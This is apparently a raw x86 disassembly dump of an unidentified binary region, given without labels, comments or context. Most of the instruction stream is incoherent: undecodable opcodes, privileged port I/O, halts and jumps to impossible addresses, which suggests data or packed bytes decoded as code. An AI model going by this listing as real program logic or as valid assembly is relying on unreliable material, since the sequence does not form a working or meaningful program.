  41aeae:	add    BYTE PTR [ecx],ch
  41aeb0:	sar    DWORD PTR [edi-0x76],1
  41aeb3:	popf   
  41aeb4:	xchg   esp,ebp
  41aeb6:	cld    
  41aeb7:	inc    esp
  41aeb8:	nop
  41aeb9:	jbe    0x41aec3
  41aebb:	fisub  WORD PTR [edi+0x3]
  41aebe:	add    BYTE PTR [ebp-0x6f],dh
  41aec1:	loopne 0x41aeca
  41aec3:	mov    ch,BYTE PTR [eax-0x78]
  41aec6:	mov    edi,0x72edc909
  41aecb:	adc    BYTE PTR gs:[ecx+0x7a],bh
  41aecf:	and    DWORD PTR [edi+0x486b84d8],0x50b887ed
  41aed9:	push   esi
  41aeda:	call   0x45d5e4
  41aedf:	call   DWORD PTR [ebp-0x5b54a313]
  41aee5:	mov    ebx,0xf2d971c1
  41aeea:	inc    ebx
  41aeeb:	xchg   ecx,eax
  41aeec:	fld    QWORD PTR [ebx]
  41aeee:	push   esi
  41aeef:	inc    BYTE PTR [ecx]
  41aef1:	sbb    bh,al
  41aef3:	jo     0x41af3f
  41aef5:	xchg   esi,eax
  41aef6:	inc    ebx
  41aef7:	jne    0x41af67
  41aef9:	in     eax,dx
  41aefa:	push   ebp
  41aefb:	or     eax,0x7503fd72
  41af00:	jnp    0x41af2e
  41af02:	dec    esi
  41af03:	aaa    
  41af04:	(bad)  
  41af05:	out    0x56,al
  41af07:	out    dx,al
  41af08:	aas    
  41af09:	jmp    0x41af5e
  41af0b:	clc    
  41af0c:	or     al,0xcb
  41af0e:	adc    al,0x35
  41af10:	add    dh,BYTE PTR [edx-0x15]
  41af13:	add    BYTE PTR [eax],al
  41af15:	add    BYTE PTR [eax],al
  41af17:	add    bh,dh
  41af19:	out    0x53,al
  41af1b:	add    dh,dh
  41af1d:	out    dx,eax
  41af1e:	pop    edx
  41af1f:	cld    
  41af20:	in     eax,dx
  41af21:	inc    DWORD PTR [eax+0x5]
  41af24:	cld    
  41af25:	mov    bh,0xc5
  41af27:	adc    edi,esp
  41af29:	mov    esi,0x51efc31d
  41af2e:	les    eax,FWORD PTR [edx-0x79220944]
  41af34:	xor    eax,DWORD PTR [ecx]
  41af36:	out    0x3,eax
  41af38:	test   al,0x1d
  41af3a:	je     0x41af7d
  41af3c:	or     DWORD PTR [ecx-0x19],eax
  41af3f:	and    DWORD PTR [ebx-0xaf1ecea],0xffffffe8
  41af46:	shl    BYTE PTR [edi+0x62],1
  41af49:	sub    BYTE PTR [edi+0x7e8f523],0xff
  41af50:	hlt    
  41af51:	pop    ebp
  41af52:	call   0x5fc4245a
  41af57:	imul   edi,DWORD PTR [eax+0x7d],0x27504c1
  41af5e:	rcl    DWORD PTR [edi],0x4c
  41af61:	add    ecx,eax
  41af63:	or     eax,0xd470c1ad
  41af68:	retf   0x6b8
  41af6b:	test   BYTE PTR [esp+eiz*2],bh
  41af6e:	add    BYTE PTR [ebx-0x4c0599c7],bh
  41af74:	xor    eax,DWORD PTR [eax+0x276e840]
  41af7a:	and    BYTE PTR [eax],0x0
  41af7d:	add    BYTE PTR [eax],al
  41af7f:	add    BYTE PTR [eax],al
  41af81:	dec    esp
  41af82:	test   DWORD PTR [edx+0x271de],0xc14a6d83
  41af8c:	imul   ebx,DWORD PTR [ecx],0x5c640d17
  41af92:	in     eax,0xfc
  41af94:	jmp    0x2a99bc35
  41af99:	imul   ah
  41af9b:	sub    al,0xf6
  41af9d:	repz or bh,bh
  41afa0:	call   0x3157081b
  41afa5:	mov    ah,0x65
  41afa7:	div    DWORD PTR [edx]
  41afa9:	dec    edx
  41afaa:	(bad)  
  41afab:	imul   esp,ecx,0xa889c33e
  41afb1:	jne    0x41afd5
  41afb3:	cmp    al,0x48
  41afb5:	inc    edi
  41afb6:	(bad)  
  41afb7:	cmp    esi,DWORD PTR [ebx]
  41afb9:	sub    ecx,DWORD PTR [edx]
  41afbb:	and    BYTE PTR [eax+0x69036661],0x8e
  41afc2:	sub    al,0x7e
  41afc4:	out    0xf6,eax
  41afc6:	in     al,dx
  41afc7:	sub    eax,0xf7658e15
  41afcc:	aam    0x89
  41afce:	sub    bl,0xe9
  41afd1:	jbe    0x41afd5
  41afd3:	push   0xffffffd2
  41afd5:	cs ret 
  41afd7:	mov    DWORD PTR [eax-0x37c3dd8b],ebp
  41afdd:	in     al,0xfe
  41afdf:	cmp    esp,ebx
  41afe1:	call   0x922fd8
  41afe6:	add    BYTE PTR [eax],al
  41afe8:	add    BYTE PTR [eax],al
  41afea:	mov    eax,ds:0x5e690366
  41afef:	sub    al,0x7e
  41aff1:	add    BYTE PTR [edx+0x82ef57e],bh
  41aff7:	loopne 0x41b075
  41aff9:	stc    
  41affa:	jno    0x41b066
  41affc:	fadd   QWORD PTR [eax-0x7bf4f89b]
  41b002:	add    al,0xd6
  41b004:	sti    
  41b005:	dec    DWORD PTR [ecx+ebx*8-0x7eee8bca]
  41b00c:	cmc    
  41b00d:	aas    
  41b00e:	xor    edi,DWORD PTR [ebp+ebp*4+0x0]
  41b012:	sbb    al,0x1
  41b014:	push   0x1f
  41b016:	aam    0xc1
  41b018:	data16 sbb al,0xe4
  41b01b:	sar    DWORD PTR [ecx+edi*8+0x1],0x6c
  41b020:	add    al,0x6a
  41b022:	jbe    0x41b05a
  41b024:	mov    edi,0x7c30d580
  41b029:	add    eax,0x7e35d84c
  41b02e:	leave  
  41b02f:	push   0xffffffbe
  41b031:	or     al,0x7c
  41b033:	xor    bl,BYTE PTR [ebp+0x72]
  41b036:	fcom   DWORD PTR [esi+eiz*2]
  41b039:	jbe    0x41b010
  41b03b:	xor    ch,0x3a
  41b03e:	sar    DWORD PTR [ebx+0x7d],cl
  41b041:	add    BYTE PTR [eax+eax*1-0x3ccbe696],bl
  41b048:	jl     0x41b043
  41b04a:	mov    bl,0xe5
  41b04c:	sbb    BYTE PTR ds:0x0,0x0
  41b053:	add    edx,esi
  41b055:	sti    
  41b056:	xor    ch,0x15
  41b059:	je     0x41b019
  41b05b:	or     al,0xc8
  41b05d:	sub    al,0x80
  41b05f:	add    eax,0x766773e8
  41b064:	repz push edi
  41b066:	ret    
  41b067:	arpl   WORD PTR [esi-0x47e97f33],bp
  41b06d:	imul   eax,DWORD PTR [eax+0x75],0xaf7300d9
  41b074:	pop    ecx
  41b075:	jmp    0x9d1f:0x5761c020
  41b07c:	sbb    ah,bh
  41b07e:	mov    ch,0x34
  41b080:	pop    edx
  41b081:	test   eax,0x99a0d7
  41b086:	add    BYTE PTR [ecx-0x42dfa92b],ah
  41b08c:	sbb    BYTE PTR [ecx-0x1c7aa90a],al
  41b092:	jg     0x41b0a0
  41b094:	mov    ch,0x75
  41b096:	xor    al,0x1e
  41b098:	jmp    0xd7a7:0x5a24b5f8
  41b09f:	mov    BYTE PTR [ecx-0x22970000],bl
  41b0a5:	push   esi
  41b0a6:	and    cl,BYTE PTR [ebp-0x68]
  41b0a9:	xor    esi,0xffffff96
  41b0ac:	dec    ebp
  41b0ad:	and    al,0x80
  41b0af:	fmul   QWORD PTR [edi+ebp*2]
  41b0b2:	sbb    dh,bl
  41b0b4:	leave  
  41b0b5:	clc    
  41b0b6:	mov    ch,0x0
  41b0b8:	add    BYTE PTR [eax],al
  41b0ba:	add    BYTE PTR [eax],al
  41b0bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0bd:	pop    ecx
  41b0be:	scas   al,BYTE PTR es:[edi]
  41b0bf:	xlat   BYTE PTR ds:[ebx]
  41b0c0:	push   eax
  41b0c1:	sbb    DWORD PTR [eax+eax*1],eax
  41b0c4:	inc    eax
  41b0c5:	fiadd  WORD PTR [eax-0x3d2a90a]
  41b0cb:	jg     0x41b079
  41b0cd:	fsubr  QWORD PTR [ecx+eax*1+0x66]
  41b0d1:	cdq    
  41b0d2:	inc    ebx
  41b0d3:	shr    eax,0x22
  41b0d6:	add    al,0xbf
  41b0d8:	out    0x1a,eax
  41b0da:	add    al,0xe8
  41b0dc:	out    0x1a,eax
  41b0de:	add    al,0x8
  41b0e0:	out    0x1a,al
  41b0e2:	add    al,0x13
  41b0e4:	out    0x1a,al
  41b0e6:	add    al,0x22
  41b0e8:	push   es
  41b0e9:	sbb    al,BYTE PTR [ecx+ebx*4]
  41b0ec:	push   es
  41b0ed:	add    ch,BYTE PTR [eax-0x5870f8fd]
  41b0f3:	add    esp,esp
  41b0f5:	(bad)  
  41b0f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0f7:	add    esp,DWORD PTR [edi+ecx*4-0x70c6fc59]
  41b0fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0ff:	add    eax,DWORD PTR [ebx]
  41b101:	(bad)  
  41b102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b103:	add    ebx,DWORD PTR ds:0x1e03a78f
  41b109:	(bad)  
  41b10a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b10b:	add    ebx,DWORD PTR [esi]
  41b10d:	(bad)  
  41b10e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b10f:	add    edi,DWORD PTR [edx-0x72]
  41b112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b113:	add    edx,DWORD PTR [esi-0x72]
  41b116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b117:	add    esp,DWORD PTR [esi+0x1686fa77]
  41b11d:	jmp    0x0:0xd869
  41b124:	add    BYTE PTR [esi+0x77],cl
  41b127:	stos   DWORD PTR es:[edi],eax
  41b128:	adc    esp,DWORD PTR [edi+esi*2+0x7748fb93]
  41b12f:	div    BYTE PTR [esi]
  41b131:	mov    ch,0x78
  41b133:	sub    ah,BYTE PTR [eax]
  41b135:	jge    0x41b1b0
  41b137:	and    ah,BYTE PTR [eax]
  41b139:	test   DWORD PTR [ecx+0x2a],edi
  41b13c:	and    BYTE PTR [ecx+0x79],dh
  41b13f:	and    ah,BYTE PTR [eax]
  41b141:	popa   
  41b142:	js     0x41b170
  41b144:	adc    ebp,ebp
  41b146:	cmp    eax,0x5e3aff03
  41b14b:	or     edi,edi
  41b14d:	xor    DWORD PTR [ebx+0x62],ecx
  41b150:	push   0x36ee6e79
  41b155:	mov    ch,0xd8
  41b157:	sbb    dl,BYTE PTR ds:0xbc6c0275
  41b15d:	pop    es
  41b15e:	cmp    eax,0x7e8a3961
  41b163:	scas   eax,DWORD PTR es:[edi]
  41b164:	outs   dx,DWORD PTR ds:[esi]
  41b165:	push   eax
  41b166:	cmp    BYTE PTR [edi+0x5],0x3
  41b16a:	fcos   
  41b16c:	push   0x85740661
  41b171:	neg    al
  41b173:	push   cs
  41b174:	(bad)  [edi]
  41b176:	(bad)  
  41b177:	neg    DWORD PTR [esp+eiz*8]
  41b17a:	sti    
  41b17b:	mov    BYTE PTR [edx-0x2a407a82],ch
  41b181:	and    ecx,DWORD PTR [ebx-0x7ad9b933]
  41b187:	mov    edi,0xb5
  41b18c:	add    BYTE PTR [eax],al
  41b18e:	sti    
  41b18f:	mov    eax,DWORD PTR [ebp-0x22]
  41b192:	xchg   edx,eax
  41b193:	xchg   DWORD PTR [ebx],ecx
  41b195:	out    0xae,al
  41b197:	inc    edi
  41b198:	adc    eax,0x8825cf12
  41b19d:	in     eax,dx
  41b19e:	push   ds
  41b19f:	mov    al,BYTE PTR [ebp-0x2]
  41b1a2:	dec    ebx
  41b1a3:	ret    0x3f
  41b1a6:	inc    ebx
  41b1a7:	adc    DWORD PTR [eax],eax
  41b1a9:	jmp    0xbd40f92e
  41b1ae:	pop    esp
  41b1af:	push   ebp
  41b1b0:	add    al,0x60
  41b1b2:	pop    edx
  41b1b3:	es sbb al,0xad
  41b1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1b7:	push   ebp
  41b1b8:	add    al,0x70
  41b1ba:	dec    ebp
  41b1bb:	es adc al,0xd
  41b1be:	test   DWORD PTR [esi],ebx
  41b1c0:	push   cs
  41b1c1:	pop    esi
  41b1c2:	jne    0x41b14d
  41b1c4:	jnp    0x41b1cb
  41b1c6:	xchg   ecx,eax
  41b1c7:	lea    eax,[ebx]
  41b1c9:	idiv   BYTE PTR [edi]
  41b1cb:	pop    ebp
  41b1cc:	and    al,0xd9
  41b1ce:	aas    
  41b1cf:	inc    ebp
  41b1d0:	and    al,0xd
  41b1d2:	pusha  
  41b1d3:	fimul  DWORD PTR [eiz*2-0x16fff0b4]
  41b1da:	neg    BYTE PTR [edi-0x1]
  41b1dd:	loopne 0x41b1f7
  41b1df:	(bad)  
  41b1e0:	je     0x41b1db
  41b1e2:	popf   
  41b1e3:	inc    edi
  41b1e4:	add    al,0x68
  41b1e6:	pop    ds
  41b1e7:	push   es
  41b1e8:	add    BYTE PTR [eax],al
  41b1ea:	dec    esp
  41b1eb:	add    eax,0x8f130f00
  41b1f0:	or     eax,DWORD PTR [eax]
  41b1f2:	add    BYTE PTR [eax],al
  41b1f4:	add    BYTE PTR [eax],al
  41b1f6:	add    BYTE PTR [esi+ebx*2+0x7a],bl
  41b1fa:	or     BYTE PTR [ebx-0x6d],cl
  41b1fd:	inc    edx
  41b1fe:	add    DWORD PTR [esi+eax*4],esp
  41b201:	hlt    
  41b202:	cmp    eax,0x101b824b
  41b207:	pop    esp
  41b208:	add    eax,0x44d124fb
  41b20d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b20e:	inc    ecx
  41b20f:	dec    esp
  41b210:	test   edi,esi
  41b212:	or     eax,0xf1c614b
  41b217:	sbb    al,0x5
  41b219:	cmp    bl,0x16
  41b21c:	fiadd  DWORD PTR [eax+0x52b16]
  41b222:	xor    BYTE PTR [edx],0x6
  41b225:	jg     0x41b275
  41b227:	adc    al,0xea
  41b229:	jg     0x41b279
  41b22b:	sub    dl,ch
  41b22d:	xchg   BYTE PTR [esi],al
  41b22f:	mov    edi,gs
  41b231:	inc    esp
  41b232:	seto   BYTE PTR [edi+0xdcfffd]
  41b239:	cld    
  41b23a:	mov    dl,dl
  41b23c:	ret    0x142
  41b23f:	fnstsw WORD PTR [ebp-0x28287f4b]
  41b245:	or     eax,DWORD PTR [edx+ebx*1+0x5c000002]
  41b24c:	out    dx,al
  41b24d:	push   es
  41b24e:	sqrtps xmm3,XMMWORD PTR [ebx-0x3d33fffd]
  41b255:	inc    edx
  41b256:	add    DWORD PTR [ebx+0x809dbd],esi
  41b25c:	add    BYTE PTR [eax],al
  41b25e:	add    BYTE PTR [eax],al
  41b260:	out    0xd7,eax
  41b262:	or     eax,DWORD PTR [ebp+ecx*8+0xcfffcde]
  41b269:	out    dx,al
  41b26a:	push   es
  41b26b:	pcmpeqw mm5,QWORD PTR [esi-0x2e]
  41b26f:	or     DWORD PTR [ebp-0x15],esi
  41b272:	cmp    DWORD PTR [ebx+0x59],0xffffffbf
  41b276:	add    dh,al
  41b278:	xor    ebp,edx
  41b27a:	xor    dh,BYTE PTR [ecx+edi*8+0x64]
  41b27e:	inc    eax
  41b27f:	or     al,0xf0
  41b281:	test   eax,0x9dee2c6c
  41b286:	sbb    al,0x14
  41b288:	out    dx,al
  41b289:	lods   eax,DWORD PTR ds:[esi]
  41b28a:	sbb    al,0x10
  41b28c:	sahf   
  41b28d:	and    edx,DWORD PTR [edx-0x77]
  41b290:	cmp    edx,DWORD PTR [ecx-0x2f]
  41b293:	xor    BYTE PTR ds:0xb389fa9e,0xb8
  41b29a:	sbb    al,0x84
  41b29c:	sub    ebp,0x63824578
  41b2a2:	aas    
  41b2a3:	adc    eax,0x4378a859
  41b2a8:	push   ecx
  41b2a9:	lock test DWORD PTR [edx+0xe9f6],0x141c85f6
  41b2b4:	jne    0x41b2a8
  41b2b6:	aas    
  41b2b7:	std    
  41b2b8:	cli    
  41b2b9:	loopne 0x41b23c
  41b2bb:	clc    
  41b2bc:	xchg   ebp,eax
  41b2bd:	call   0xe9bab73e
  41b2c2:	add    BYTE PTR [eax+0x0],al
  41b2c8:	add    dh,bl
  41b2ca:	shl    ch,cl
  41b2cc:	sbb    ebx,0xffffffd4
  41b2cf:	add    BYTE PTR [eax],al
  41b2d1:	mov    ebx,0xdc2b032f
  41b2d6:	fucom  st(5)
  41b2d8:	cld    
  41b2d9:	ret    0xe969
  41b2dc:	or     DWORD PTR [edx+0x66],ebp
  41b2df:	dec    ebp
  41b2e0:	add    DWORD PTR [ebp-0x17],esi
  41b2e3:	jbe    0x41b2ea
  41b2e5:	mov    ch,0xc1
  41b2e7:	add    DWORD PTR [eax-0x7f09fd93],ebp
  41b2ed:	xchg   edx,eax
  41b2ee:	or     esp,edi
  41b2f0:	add    edi,DWORD PTR [ebx-0x22d417b8]
  41b2f6:	repnz adc edi,edx
  41b2f9:	add    ah,BYTE PTR [eax-0x23]
  41b2fc:	add    BYTE PTR [ecx],al
  41b2fe:	push   es
  41b2ff:	mov    edx,0xba035dc3
  41b304:	ret    
  41b305:	stos   BYTE PTR es:[edi],al
  41b306:	ret    0xff86
  41b309:	ins    BYTE PTR es:[edi],dx
  41b30a:	inc    esi
  41b30b:	or     esi,edi
  41b30d:	repnz inc edi
  41b30f:	idiv   BYTE PTR [edx-0x47]
  41b312:	repnz imul eax,esp,0xffffffc6
  41b316:	repz popa 
  41b318:	mov    dh,0x41
  41b31a:	mov    dl,0x69
  41b31c:	fdivr  QWORD PTR [edx]
  41b31e:	push   ebx
  41b31f:	icebp  
  41b320:	cmp    eax,DWORD PTR [eax+0x2af68185]
  41b326:	fbld   TBYTE PTR [esi-0xa]
  41b329:	mov    ds:0xeac8c,al
  41b32e:	add    BYTE PTR [eax],al
  41b330:	add    BYTE PTR [eax],al
  41b332:	push   ecx
  41b333:	pop    edi
  41b334:	outs   dx,DWORD PTR ds:[esi]
  41b335:	inc    eax
  41b336:	pop    ecx
  41b337:	(bad)  
  41b339:	jg     0x41b373
  41b33b:	loopne 0x41b34a
  41b33d:	out    0xed,eax
  41b33f:	inc    ebp
  41b340:	retf   
  41b341:	adc    ecx,DWORD PTR [ebp+eax*2-0x15]
  41b345:	fcomp  QWORD PTR [edi+ecx*1]
  41b348:	out    0x3,eax
  41b34a:	cld    
  41b34b:	inc    esp
  41b34c:	fistp  DWORD PTR [edx]
  41b34e:	cmp    DWORD PTR [esi],esp
  41b350:	idiv   DWORD PTR [edx+0x28]
  41b353:	push   cs
  41b354:	jmp    0xf3e9:0x61796540
  41b35b:	inc    ebp
  41b35c:	add    ebx,DWORD PTR [esp+ebp*8]
  41b35f:	inc    edi
  41b360:	out    dx,eax
  41b361:	sub    ch,BYTE PTR [eax+0x7b71d756]
  41b367:	sbb    eax,DWORD PTR [eax]
  41b369:	sub    eax,0xe1712a55
  41b36e:	pop    ds
  41b36f:	iret   
  41b370:	xchg   BYTE PTR ds:0xf1e91655,dh
  41b376:	rdpmc  
  41b378:	and    al,0xc1
  41b37a:	or     DWORD PTR [ebx+0x24],ebx
  41b37d:	aad    0xf7
  41b37f:	pop    edx
  41b380:	and    al,0xe1
  41b382:	jbe    0x41b3d7
  41b384:	or     BYTE PTR [edx-0x26],dh
  41b387:	adc    BYTE PTR es:[eax-0x2e],ah
  41b38b:	es sbb dl,al
  41b38e:	xor    al,0xfb
  41b390:	dec    ebx
  41b391:	or     eax,0xf14585a5
  41b396:	add    BYTE PTR [eax],al
  41b398:	add    BYTE PTR [eax],al
  41b39a:	add    bh,cl
  41b39c:	inc    ecx
  41b39d:	and    al,0xf9
  41b39f:	int    0x41
  41b3a1:	adc    BYTE PTR [esi-0x3f],cl
  41b3a4:	inc    ecx
  41b3a5:	and    al,0xd9
  41b3a7:	mov    edi,0x39f20847
  41b3ac:	test   DWORD PTR [ebp-0x1b],ecx
  41b3af:	and    eax,DWORD PTR [ecx+0x276dc99]
  41b3b5:	(bad)  
  41b3b6:	scas   eax,DWORD PTR es:[edi]
  41b3b7:	jno    0x41b3d5
  41b3b9:	aaa    
  41b3ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3bb:	jb     0x41b3b7
  41b3bd:	or     al,0x6d
  41b3bf:	inc    edx
  41b3c0:	fdiv   st(4),st
  41b3c2:	push   cs
  41b3c3:	jg     0x41b41d
  41b3c5:	or     BYTE PTR [edx+0x3b],dh
  41b3c8:	test   BYTE PTR [edx-0x76d69dd7],0x9d
  41b3cf:	mov    bh,dl
  41b3d1:	mov    BYTE PTR [ebp-0x4cd70d7e],bl
  41b3d7:	ss dec ebp
  41b3d9:	mov    DWORD PTR [edi-0x567d3228],ebp
  41b3df:	inc    ebp
  41b3e0:	or     BYTE PTR [edx-0x79d98fd9],cl
  41b3e6:	add    al,al
  41b3e8:	fild   WORD PTR [esi+eax*2+0x17435bcb]
  41b3ef:	js     0x41b458
  41b3f1:	mov    BYTE PTR [eax+edi*2-0x29],al
  41b3f5:	or     eax,DWORD PTR [ebp-0x4189a]
  41b3fb:	pop    ds
  41b3fc:	bound  esp,QWORD PTR [eax+ebx*1]
  41b3ff:	add    BYTE PTR [eax],al
  41b401:	add    BYTE PTR [eax],al
  41b403:	add    BYTE PTR [eax+edi*4-0x180c01f6],bl
  41b40a:	jl     0x41b407
  41b40c:	adc    esi,0x1614280
  41b412:	add    BYTE PTR [eax-0x7bf42719],al
  41b418:	and    eax,0xe6fffcd4
  41b41d:	sbb    al,0x13
  41b41f:	and    al,0xc6
  41b421:	fiadd  DWORD PTR [esi]
  41b423:	jmp    0x3e88a0
  41b428:	call   0x8127:0xc702fd1c
  41b42f:	jmp    DWORD PTR [ebx]
  41b431:	pop    ebp
  41b432:	sbb    al,0xd
  41b434:	sbb    al,0x1
  41b436:	xchg   esi,ecx
  41b438:	push   ebx
  41b439:	iret   
  41b43a:	add    eax,0x4686daf8
  41b440:	or     edi,ebp
  41b442:	jl     0x41b450
  41b444:	sbb    eax,0x96174359
  41b449:	sbb    al,0x13
  41b44b:	and    al,0xf3
  41b44d:	pop    eax
  41b44e:	inc    ecx
  41b44f:	and    al,0xe3
  41b451:	aad    0x80
  41b453:	(bad)  
  41b454:	rol    BYTE PTR [eax],1
  41b456:	add    BYTE PTR [ebx+0x2b0ffd18],cl
  41b45c:	mov    edx,ebx
  41b45e:	cmp    al,0xe9
  41b460:	push   eax
  41b461:	xlat   BYTE PTR ds:[ebx]
  41b462:	cld    
  41b463:	push   DWORD PTR [ebp+0x6b]
  41b466:	call   0x41b4be
  41b46b:	add    BYTE PTR [eax],al
  41b46d:	dec    eax
  41b46e:	loope  0x41b4e6
  41b470:	add    eax,0xfef4c691
  41b475:	cli    
  41b476:	in     al,0xd7
  41b478:	dec    edx
  41b479:	cmc    
  41b47a:	(bad)  
  41b47b:	cmp    eax,0xf52af80d
  41b480:	call   FWORD PTR [edx-0x4403e496]
  41b486:	and    al,0xe
  41b488:	add    dh,BYTE PTR [ebx-0x44fe00d4]
  41b48e:	and    al,0x1
  41b490:	adc    cl,BYTE PTR [ebp+ebp*4+0x6a72fff4]
  41b497:	sbb    eax,DWORD PTR [ecx]
  41b499:	mul    BYTE PTR [ebx]
  41b49b:	cld    
  41b49c:	cld    
  41b49d:	idiv   bl
  41b49f:	idiv   esp
  41b4a1:	cmc    
  41b4a2:	pusha  
  41b4a3:	div    DWORD PTR [ebx+0x1]
  41b4a6:	push   0xffffffe8
  41b4a8:	or     al,cl
  41b4aa:	ins    BYTE PTR es:[edi],dx
  41b4ab:	cmp    eax,0xd7dbcad
  41b4b1:	push   0xbbc600e9
  41b4b6:	jmp    0xfce4:0x14a0e6fd
  41b4bd:	cmc    
  41b4be:	adc    BYTE PTR [ebp+0xd],cl
  41b4c1:	lock push ebp
  41b4c3:	add    al,BYTE PTR [eax]
  41b4c5:	jne    0x41b4ea
  41b4c7:	cmp    edi,edi
  41b4c9:	jo     0x41b4cd
  41b4cb:	jne    0x41b4d8
  41b4cd:	jne    0x41b4b8
  41b4cf:	cmp    al,0x0
  41b4d2:	add    BYTE PTR [eax],al
  41b4d4:	add    BYTE PTR [eax],al
  41b4d6:	mov    eax,ds:0x74797dd4
  41b4db:	jmp    0xea757ae0
  41b4e0:	sti    
  41b4e1:	out    0x5f,al
  41b4e3:	mov    ebp,0x2f50000
  41b4e8:	loop   0x41b51e
  41b4ea:	add    BYTE PTR [ebp+0x275054e],0xad
  41b4f1:	dec    edx
  41b4f2:	ret    0xc003
  41b4f5:	ins    BYTE PTR es:[edi],dx
  41b4f6:	imul   eax,DWORD PTR [edx],0x2bad83e7
  41b4fc:	out    dx,al
  41b4fd:	mov    BYTE PTR [eax+0x1],al
  41b500:	out    0x3,eax
  41b502:	mov    ebx,0x920ce844
  41b507:	xor    al,0xf3
  41b509:	add    esi,DWORD PTR [ebp-0x73]
  41b50c:	sub    DWORD PTR [esi+ecx*2+0x1b361e09],esi
  41b513:	or     ecx,DWORD PTR [ebp-0x39]
  41b516:	adc    BYTE PTR [edi-0x72],bh
  41b519:	adc    al,0xdb
  41b51b:	mov    DWORD PTR [esp+esi*8],esp
  41b51e:	xor    BYTE PTR [eax+ebp*8+0xd],al
  41b522:	pop    edx
  41b523:	sbb    bl,bl
  41b525:	add    esi,DWORD PTR [ebp-0x7e]
  41b528:	popa   
  41b529:	xor    al,dh
  41b52b:	or     DWORD PTR ds:0x40084a4a,esp
  41b531:	xor    BYTE PTR [ecx+0x2],dh
  41b534:	out    0x83,eax
  41b536:	cmp    eax,0x2dc312
  41b53b:	add    BYTE PTR [eax],al
  41b53d:	add    BYTE PTR [eax],al
  41b53f:	cmc    
  41b540:	(bad)  
  41b541:	jmp    DWORD PTR [edx+0x56]
  41b544:	bound  ecx,QWORD PTR fs:[edx-0x7b]
  41b548:	fs ret 0x6cc3
  41b54c:	mul    BYTE PTR fs:[ecx-0x3b159bc3]
  41b553:	nop
  41b554:	jg     0x41b554
  41b556:	adc    ebx,DWORD PTR [ebx-0x3c0c5b77]
  41b55c:	loop   0x41b547
  41b55e:	add    esi,DWORD PTR [ebp+0x64]
  41b561:	ret    0x79c4
  41b564:	test   bh,bh
  41b566:	repz jae 0x41b56b
  41b569:	add    BYTE PTR [ebx+0x2f],ah
  41b56c:	cmc    
  41b56d:	and    esi,DWORD PTR [edx-0x7e]
  41b570:	or     edi,esp
  41b572:	sar    DWORD PTR [edx+0x2],1
  41b575:	add    BYTE PTR [ebx+edi*1-0x4e],ah
  41b579:	cmp    esp,eax
  41b57b:	pop    ds
  41b57c:	out    0x65,eax
  41b57e:	not    ah
  41b580:	shl    DWORD PTR [ebp+0x6a],0x9e
  41b584:	sub    ah,BYTE PTR [esi+0x60]
  41b587:	sub    al,0xf0
  41b589:	lds    esp,FWORD PTR [edi]
  41b58b:	jo     0x41b59b
  41b58d:	out    0xbc,eax
  41b58f:	add    DWORD PTR [edx],0x0
  41b592:	imul   ebp,DWORD PTR [ebx-0x531f8d06],0x89dbff44
  41b59c:	lds    ecx,FWORD PTR [eax]
  41b59e:	jmp    0xba3a3819
  41b5a3:	add    BYTE PTR [eax],al
  41b5a5:	add    BYTE PTR [eax],al
  41b5a7:	add    dl,cl
  41b5a9:	lds    edi,FWORD PTR [edi+0x72]
  41b5ac:	adc    DWORD PTR [edi-0x40],0x123fea07
  41b5b3:	iret   
  41b5b4:	jecxz  0x41b578
  41b5b6:	or     edi,eax
  41b5b8:	addr16 cwde 
  41b5ba:	enter  0x7bcf,0x99
  41b5be:	gs push 0x4e
  41b5c1:	sub    ah,BYTE PTR [esi+0x70]
  41b5c4:	mov    esp,0x560e8f4
  41b5c9:	inc    ebx
  41b5ca:	shl    ch,1
  41b5cc:	jno    0x41b61d
  41b5ce:	adc    eax,edi
  41b5d0:	xchg   DWORD PTR [eax-0x1e047040],ebx
  41b5d6:	das    
  41b5d7:	xchg   ecx,edi
  41b5d9:	aas    
  41b5da:	adc    al,0x2f
  41b5dc:	lods   al,BYTE PTR ds:[esi]
  41b5dd:	(bad)  [edx]
  41b5df:	add    dh,ch
  41b5e1:	or     al,BYTE PTR [eax]
  41b5e3:	add    ah,bl
  41b5e5:	test   edi,esi
  41b5e7:	and    bl,bl
  41b5e9:	cmp    DWORD PTR [ebx+0xb],0x468a05cc
  41b5f0:	ret    
  41b5f1:	and    DWORD PTR [esp+ecx*1+0xc66ecc8],ecx
  41b5f8:	fadd   QWORD PTR ds:0x22fc4389
  41b5fe:	add    eax,0x876c7277
  41b603:	inc    esi
  41b604:	shr    BYTE PTR [ebx+0x67],1
  41b607:	shl    BYTE PTR [esi+0xbe0b6b],0x0
  41b60e:	add    BYTE PTR [eax],al
  41b610:	add    bh,dl
  41b612:	ins    BYTE PTR es:[edi],dx
  41b613:	inc    eax
  41b615:	xor    bh,BYTE PTR [edi-0x1c]
  41b618:	xor    BYTE PTR ds:0x9cffffeb,dl
  41b61e:	imul   eax,DWORD PTR [ebp+0x376b8046],0xffffffc1
  41b625:	arpl   WORD PTR [edx+0x56746e5],si
  41b62b:	add    BYTE PTR [eax+0x2a7407f7],al
  41b631:	int3   
  41b632:	mov    bh,0x9
  41b634:	je     0x41b675
  41b636:	test   edi,esi
  41b638:	and    BYTE PTR [ecx],dh
  41b63a:	jge    0x41b5fe
  41b63c:	inc    esi
  41b63d:	pop    ebp
  41b63e:	repnz in al,0x2e
  41b641:	push   edi
  41b642:	add    eax,0x9a78000
  41b647:	jno    0x41b652
  41b649:	bound  ecx,QWORD PTR [ebp+edi*8+0xf]
  41b64d:	lds    ebx,FWORD PTR [esi]
  41b64f:	pop    es
  41b650:	add    BYTE PTR [eax*4-0x7fc4f509],cl
  41b657:	adc    ecx,DWORD PTR [ebx]
  41b659:	sbb    al,0x5
  41b65b:	mov    BYTE PTR [esi+0x1d],0x28
  41b65f:	in     eax,0xe
  41b661:	jne    0x41b647
  41b663:	add    BYTE PTR [eax],al
  41b665:	cmc    
